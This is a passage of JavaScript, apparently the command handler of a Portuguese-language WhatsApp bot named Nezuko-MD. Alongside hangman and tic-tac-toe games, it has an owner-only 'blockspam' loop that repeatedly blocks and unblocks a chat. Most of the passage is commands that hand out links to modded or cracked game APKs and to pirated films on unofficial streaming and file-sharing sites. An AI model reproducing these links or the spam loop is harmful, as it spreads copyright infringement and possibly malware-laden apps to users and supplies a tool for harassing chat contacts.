    word_original: word_correct,
    word: word_correct,
    under_word: under_word,
    array_word: Array.from(word_correct),
    array_under_word: Array.from(under_word),
    tam: word_correct.length,
    attempts: 6
})
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Jogo da forca iniciado!✅*\n\n*Palavra: ${under_word.split('').join(' ')}*\n*Para advinhar uma letra , dê o comando ${prefix}forca mais a letra*`)
break

case'reagir': {

if (!SoDono) return m.reply(`<❗> Somente meu dono pode usar esse comando.`)

reactionMessage = {react: {text: args[0], key: { remoteJid: m.chat, fromMe: true, id: quoted.id }

                    }

                }

                nezuko.sendMessage(m.chat, reactionMessage)}

            break

case 'jogodavelha':
if (!isGame) return reply(mensagem[0].game);
if(!isGroup) return reply('comando apenas para grupos')
joguinhodavelhajs.push(sender)
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if (fs.existsSync(`./funções de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
     
<❗> Alguém está jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}
     
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
     
 Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
nezuko.sendMessage(from, {text: chatMove}, {quoted: dnselo,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(`*⟅❗⟆ Jogue com Alguem!!!!*
*para inicar a partida : ${prefix + command} @membro do gp*`);
const boardnow = setGame(`${from}`);
console.log(`Start No jogodavelha ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(`./funções de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*
     
@${sender.replace("@s.whatsapp.net",
"")} _está te desafiando para uma partida de jogo da velha..._
_[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
     `;
nezuko.sendMessage(from, {text: strChat}, {quoted: dnselo,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break

case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv':
if (!isGame) return reply(mensagem[0].game);
if (!isJoguin && !isGroupAdmins) return reply(`Fale com quem iniciou o jogo, só ele pode resetar, ou então algum ADM`)
if (fs.existsSync("./funções de cmd/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./funções de cmd/tictactoe/db/" + from + ".json");
reply(`Jogo da velha resetado com sucesso nesse grupo!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
reply(`Não a nenhuma sessão em andamento...`);
}
break

case 'blockspam': 

if (!SoDono) return m.reply(`<❗> Somente meu dono pode usar esse comando.`)

if (m.isGroup) return reply(`Apenas em privado`)
if (!q) return reply('Cadê a quantidade mn? 🤷‍♂?')
for (let i = `${q}`;i !== 0; i -=1){
nezuko.updateBlockStatus(from, "block")
nezuko.updateBlockStatus(from, "unblock")
}
break

case 'listajogos':
botaoale = [
{title: "",
rows: [
{title: "➣ 𝐌𝐈𝐍𝐄𝐂𝐑𝐀𝐅𝐓 𝟏.𝟏𝟔.𝟐𝟐𝟏.𝟎𝟏", rowId: `${prefix}jogo1`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️ 𝐃𝐑𝐀𝐆𝐎𝐍 𝐁𝐀𝐋𝐋 𝐙 - 𝐃𝐎𝐊𝐊𝐀𝐍", rowId: `${prefix}jogo2`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐆𝐓𝐀 𝐒𝐀𝐍 𝐀𝐍𝐃𝐑𝐄𝐀𝐒 𝐎𝐅𝐂", rowId: `${prefix}jogo3`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐆𝐓𝐀 𝐒𝐀 𝐋𝐄𝐆𝐄𝐍𝐃𝐀𝐃𝐎 𝐄𝐌 𝐏𝐓/𝐁𝐑", rowId: `${prefix}jogo4`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣ 𝐆𝐓𝐀 𝐒𝐀 𝐂𝐎𝐌 𝐌𝐎𝐃 𝐂𝐋𝐄𝐎", rowId: `${prefix}jogo5`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣ 𝐆𝐓𝐀 𝐒𝐀 𝐎𝐍𝐋𝐈𝐍𝐄", rowId: `${prefix}jogo6`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐆𝐓𝐀 𝐒𝐔𝐏𝐄𝐑 𝐋𝐈𝐓𝐄 + 𝐌𝐎𝐃 𝐂𝐋𝐄𝐎", rowId: `${prefix}jogo7`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐋𝐀𝐒𝐓 𝐃𝐀𝐘 𝐎𝐍 𝐄𝐀𝐑𝐓 𝐒𝐔𝐑𝐕𝐈𝐕𝐀𝐋", rowId: `${prefix}jogo8`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐁𝐎𝐌𝐁𝐄𝐑 𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐌𝐎𝐃", rowId: `${prefix}jogo9`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐀𝐑𝐂𝐀𝐃𝐄 𝐇𝐔𝐍𝐓𝐄𝐑", rowId: `${prefix}jogo10`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐃𝐄𝐅𝐄𝐒𝐀 𝐃𝐄 𝐙𝐎𝐌𝐁𝐈𝐄 𝐎𝐂𝐈𝐎𝐒𝐎", rowId: `${prefix}jogo11`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐏𝐀𝐂-𝐌𝐀𝐍", rowId: `${prefix}jogo12`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐂𝐀𝐑 𝐃𝐑𝐈𝐕𝐈𝐍𝐆 𝐒𝐂𝐇𝐎𝐎𝐋 𝐒𝐈𝐌𝐔𝐋𝐀𝐓𝐎𝐑", rowId: `${prefix}jogo13`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐂𝐘𝐁𝐄𝐑 𝐅𝐈𝐆𝐇𝐓𝐄𝐑𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌", rowId: `${prefix}jogo14`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣ 𝐃𝐑𝐀𝐆 𝐑𝐀𝐂𝐈𝐍𝐆", rowId: `${prefix}jogo15`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐌𝐑. 𝐁𝐑𝐎𝐖", rowId: `${prefix}jogo16`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐀𝐈𝐑𝐏𝐎𝐑𝐓 𝐂𝐈𝐓𝐘", rowId: `${prefix}jogo17`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣ 𝐂𝐑𝐀𝐒𝐇 𝐁𝐀𝐍𝐃𝐈𝐂𝐎𝐎𝐓", rowId: `${prefix}Jogo18`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐑𝐄𝐀𝐋 𝐒𝐓𝐄𝐄𝐋 𝐖𝐎𝐑𝐋𝐃 𝐑𝐎𝐁𝐎𝐓 𝐁𝐎𝐗𝐈𝐍𝐆", rowId: `${prefix}jogo19`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐀𝐍𝐆𝐄𝐑 𝐎𝐅 𝐒𝐓𝐈𝐂𝐊𝐄𝐑", rowId: `${prefix}jogo20`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐀𝐍𝐆𝐑𝐘 𝐁𝐈𝐑𝐃𝐒 𝟐", rowId: `${prefix}jogo21`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐅𝐎𝐑𝐂𝐄 𝐆𝐑𝐎𝐔𝐏 𝟐 (𝐂𝐒)", rowId: `${prefix}jogo22`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐑𝐎𝐁𝐋𝐎𝐗", rowId: `${prefix}jogo23`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐂𝐒 𝐒𝐓𝐑𝐈𝐊𝐄𝐑", rowId: `${prefix}jogo24`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐃𝐑𝐄𝐀𝐌 𝐋𝐄𝐀𝐆𝐔𝐄 𝐒𝐎𝐂𝐂𝐄𝐑", rowId: `${prefix}jogo25`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐂𝐋𝐀𝐒𝐇 𝐎𝐅 𝐂𝐋𝐀𝐍𝐒", rowId: `${prefix}jogo26`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐂𝐑𝐈𝐌𝐈𝐍𝐀𝐋 𝐂𝐀𝐒𝐄 𝐏𝐀𝐑𝐈𝐒", rowId: `${prefix}jogo27`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐃𝐑𝐈𝐅𝐓 𝐌𝐀𝐗 𝐖𝐎𝐑𝐋𝐃", rowId: `${prefix}jogo28`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐃𝐎𝐖𝐍𝐇𝐈𝐋𝐋 𝐌𝐀𝐒𝐓𝐄𝐑𝐒", rowId: `${prefix}jogo29`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "️➣ 𝐌𝐎𝐍𝐎𝐏𝐎𝐋𝐘", rowId: `${prefix}jogo30`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"}]
}]
sendlistA(from, "© _Copyright by Nezuko-MD_", "", "️[🎮] 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐉𝐎𝐆𝐎𝐒 [🎮️]", "Selecione abaixo:", botaoale)
break

case 'jogo1':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *Minecraft:* https://www.mediafire.com/file/w9sms627ql2np6i/Minecraft_1.16.221.01_ByHT.apk/file
`)
break

case 'downloadbot':
case 'nezukolink':
case 'download-md':
await reply(`
Olá aqui está o link de download da Nezuko bot V1, espero que você goste!
👥 Número: @${sender.split("@")[0]}

https://www.mediafire.com/file/9nfwjo0p29y6bfp/nezuko-bot.zip/file?dkey=osxktmtheit&r=1371`)
break

case 'jogo2':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *DragonBall Z - Dokkan:* https://www.mediafire.com/file/015ibjiljfkv7uo/Dokkan_v4_12_1_MOD.apk/file
`)
break

case 'jogo3':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *GTA SanAndreas:* https://www.mediafire.com/file/ln6r3kx0ie77r9t/GTA_San_Andreas_2021.zip/file
`)
break

case 'jogo4':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *GTA SA - Legendado em Português:* http://www.mediafire.com/file/7op13aup1ll7m9y/GTA_SA_COM_TRADU%25C3%2587%25C3%2583O_PT-BR.zip/file
`)
break

case 'jogo5':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *GTA SA com Mod Cleo:* http://www.mediafire.com/file/d8cfwzctx95x0dx/GTA_SA_v2.00_Mod_Cleo.zip/file
`)
break

case 'jogo6':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *GTA SA Online:* https://www.mediafire.com/file/0xccd5m0zwqstag/GTA_SA_ONLINE_SAMP_ByHT.zip/file
`)
break

case 'jogo7':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *GTA SuperLite + Mod Cleo:* http://www.mediafire.com/file/wdkg8pmndtihil3/GTA_SA_super_lite_mod_cleo_ByHT.zip/file
`)
break

case 'jogo8':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *LastDay on Eart Survival:* https://www.mediafire.com/file/k4pr6awvr5eb1ak/Last%20Day%20on%20Earth%201.17.7-mod.apk/file 
`)
break

case 'jogo9':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Bomber Friends MOD:* https://www.mediafire.com/file/dir8pwrb1mpm57w/Bomber_Friends_v4.10_MOD.apk/file
`)
break

case 'jogo10':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣ *Arcade Hunter:* https://www.mediafire.com/file/ugcdaclnpodtxxs/Arcade_Hunter-Sword%252CGun%252C_and_Magic_1.11.0-mod.apk/file
`)
break

case 'jogo11':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Defesa de Zombie Ocioso:* https://www.mediafire.com/file/8422sjofw1cdnka/Zombie+Idle+Defense+1.5.79.229MOD-t.apk/file
`)
break

case 'jogo12':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Pac-Man:* https://www.mediafire.com/file/gxwy01ni99pcur2/PAC-MAN+9.2.7.10150MOD-t.apk/file
`)
break

case 'jogo13':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Car Driving School Simulator - APK:* https://www.mediafire.com/file/r6aps8mn6wqoabj/Car+Driving+School+Simulator+3.1.0.283MOD-t.apk/file
⚠️ Obrigatório - OBB:
 https://www.mediafire.com/file/hcsb5tpr7byh8fg/com.boombitgames.DrivingSchoolParking.zip/file
`)
break

case 'jogo14':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Cyber Fighters Premium:* https://www.mediafire.com/file/4tmv2cdahvqamlx/Cyber+Fighters+Premium+1.11.35.68MOD-t.apk/file
`)
break

case 'jogo15':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Drag Racing:* https://www.mediafire.com/file/g88v399ks1fpnfq/drag-racing-mod_2.0.37.rar/file
`)
break

case 'jogo16':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Mr. Brow:* https://www.mediafire.com/file/i0ii099sejk9fnk/Mr+Bow+4.15.75MOD-t.apk/file
`)
break

case 'jogo17':
await reply(`
OLÁ *${pushname}* AKI ESTÁ SEU PEDIDO 🤙
☔ *Número* : @${sender.split("@")[0]}

➣️ *Airport City:* https://www.mediafire.com/file/vuupmpp3r03lso0/Airport+City+8.7.18.101418MOD-t.apk/file
`)
break

case 'jogo18':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Crash Bandicoot:* https://www.mediafire.com/file/nyx8rjqn5m51o3r/Crash+Bandicoot+Mobile+v0.7.6242+Mod.apk/file 
`)
break

case 'jogo19':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Real Steel World Robot Boxing (APK+OBB):* https://www.mediafire.com/file/zcnsxb55mldn51e/Real+Steel+World+Robot+Boxing+v54.54.126+Mod.apk/file
`)
break

case 'jogo20':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Anger of Sticker:* https://www.mediafire.com/file/zfmqmszkhbgoem2/anger-of-stick-5-mod_1.1.39.apk/file
`)
break

case 'jogo21':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Angry Birds 2 (APK+OBB)*
https://www.mediafire.com/file/uwnurszwrdbv5ge/angrybirds2-2481.apk/file
`)
break

case 'jogo22':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Especial Force Group 2 (CS):* https://www.mediafire.com/file/uwf5cq9u8tjg44x/specialforcesgroup2-421.apk/file
`)
break

case 'jogo23':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Roblox:* https://apkadmin.com/k05ck2q6ioo1/ROBLOX_v2.459.415955_MOD_MENU.apk.html
`)
break



case 'jogo24':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Critical Striker:* https://www.mediafire.com/file/7yqmk1gn4wrieri/CRITICAL_STRIKE.zip/file
`)
break

case 'jogo25':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Dream League Soccer:* http://www.mediafire.com/file/yuw9n5d4phzz5wg/Dream_League_Soccer_2019_v6.13-mod.apk/file
`)
break

case 'jogo26':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️️ *Clash of Clans:* http://www.mediafire.com/file/aoaem76tyg0hvfv/Clash_Of_Clans_v13.675.6_MOD.apk/file
`)
break

case 'jogo27':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Criminal Case Paris:* http://www.mediafire.com/fil...e/i5pbv8d7yjbbtly/Criminal%20Case%20Paris%20v2.36.1-mod.apk/file
`)
break

case 'jogo28':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Drift Max World:* https://www.mediafire.com/file/hqui6asekutsocq/DRIFT+MAX+WORLD+DINHEIRO+INFINITO.zip/file`)
break

case 'jogo29':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

➣️ *Downhill Masters:* https://www.mediafire.com/file/9cdgreyc8amkto9/Downhill_Masters_v1.0.59_MOD.apk/file`)
break

case 'jogo30':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


➣ *Monopoly:* https://www.mediafire.com/file/q5jfi61xwbqiu2x/Monopoly-v1-7-11-mod.zip/file`)
break

case'filme2':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


homem aranha sem volta pra casa: https://drive.google.com/file/d/1jNUcLsJqRNcrYD_pMkrUc066TIEWhFRf/view?usp=drivesdk`)
break

case'filme3':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Cidade perdida: https://overflix.online/filmes/cidade-perdida-online/`)
break

case'filme4':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Thor Amor e trovão : https://overflix.online/filmes/thor-amor-e-trovao-hd-gratis-online/`)
break

case'filme5':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


PINÓQUIO 2: https://overflix.online/filmes/pinoquio-2/`)
break

case'filme6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Rua do medo parte 1: https://overflix.online/filmes/rua-do-medo-1994-parte-1/`)
break

case'filme7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Na mente do demônio: https://overflix.online/filmes/na-mente-do-demonio/`)
break

case'filme8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


O homem nas trevas: https://overflix.online/filmes/o-homem-nas-trevas-2-online-hd/`)
break

case'filme9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Compilados TERROR: https://overflix.online/?s=Terror`)
break

case'filme10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Halloween kills o terror continua : https://overflix.online/filmes/halloween-kills-o-terror-continua/`)
break

case'filme11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


O predador a caçada: https://overflix.online/filmes/o-predador-a-cacada/`)
break

case'filme12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Os primeiros passos de groot: https://overflix.online/filmes/os-primeiros-passos-de-groot/`)
break

case'filme13':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Tá chovendo hambúrguer 2: https://overflix.online/filmes/ta-chovendo-hamburguer-2/`)
break

case'filme14':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Minions a origem do gru: https://overflix.online/filmes/minions-2-a-origem-de-gru/`)
break

case'filme15':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


The Sandman: https://overflix.online/series/the-sandman-online-hd-gratis/`)
break

case'filme16':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


The Batman: https://photos.app.goo.gl/F6zsDNxipwYdxS9s9`)
break

case'filme17':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


As branquelas: https://drive.google.com/file/d/1avm4yXd2tg1lZKy00yZRknboNv2Dxqpi/view?usp=drivesdk`)
break

case'filme18':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Interestelar https://drive.google.com/file/d/10nSkrlV_TwkqtyFJ_h-c3GlLx-E7nqz9/view?usp=drivesdk`)
break

case'filme19':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Um olhar do paraíso: https://drive.google.com/file/d/102IWrzkbMAYDxkPmwMuHDuKFK3HGVFWF/view?usp=drivesdk`)
break

case'filme20':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Barbie: https://drive.google.com/drive/folders/1-yFkZrcyph8b1l4yrPpD7oaF5DHD7wss`)
break

case'filme21':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Maze Runner: https://photos.app.goo.gl/D68AJD4SgQmvMyjY7`)
break

case'filme22':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Mad max: https://photos.app.goo.gl/88nQZhtu7v3ZWbNe6`)
break

case'filme23':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Homem Aranha: https://photos.app.goo.gl/mLzQtYumEfMpYQ4p7`)
break

case'filme24':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Sherlock Homes: https://photos.app.goo.gl/Eg5dJLspQhcaznAv5`)
break

case'filme25':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Cinquenta tons de cinza: https://photos.app.goo.gl/3QoCnRNfwJ83KBau6`)
break

case'filme26':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Crepúsculo: https://photos.app.goo.gl/9etPkcZVG42Ngzm29`)
break

case'filme27':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Bad Boys: https://photos.app.goo.gl/sVdfEwLKzg4sghxx6`)
break

case'filme28':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Vingadores: https://photos.app.goo.gl/uQRWCRbrLc5yPgPi8`)
break

case'filme29':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Velozes e Furiosos: https://photos.app.goo.gl/dSJPea6tf5QEZMK77`)
break

case'filme30':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Batman (1989 - 2016): https://photos.app.goo.gl/x1ZywBqZFNoijUkA6`)
break

case'filme31':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


As vantagens de ser invisível: https://drive.google.com/file/d/12cnRyPwcXDTbbU26MF7wXhz9cnotdEoX/view?usp=drivesdk`)
break

case'filme32':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Moana: https://drive.google.com/file/d/1aHVoN-kWxIvdQBi9a6OMSqXws7q674Cr/view?usp=drivesdk`)
break

case'filme33':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Programação para princesas: https://drive.google.com/file/d/1aHVoN-kWxIvdQBi9a6OMSqXws7q674Cr/view?usp=drivesdk`)
break

case'filme34':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


As crônicas de Nárnia: https://drive.google.com/folderview?id=1QYz_a12LMrs0Trz2RyfcsrkoNYLsjpdg`)
break

case'filme35':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Culpa é das estrelas: https://drive.google.com/file/d/1ADMJxVpf0RLTJZBpjj_lb0KRGb_OQHs1/view`)
break

case'filme36':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Garota infernal: https://drive.google.com/file/d/1cGSEO0tEPg44Yt1AcVXpNgdzMOXXZ64F/view?usp=drivesdk`)
break

case'filme37':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


Verdade ou Desafio: https://drive.google.com/file/d/1mzr_E-OmjQpwouBx2oOo3y4qZStxN-2Z/view?usp=drivesdk`)
break

case'filme38':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}


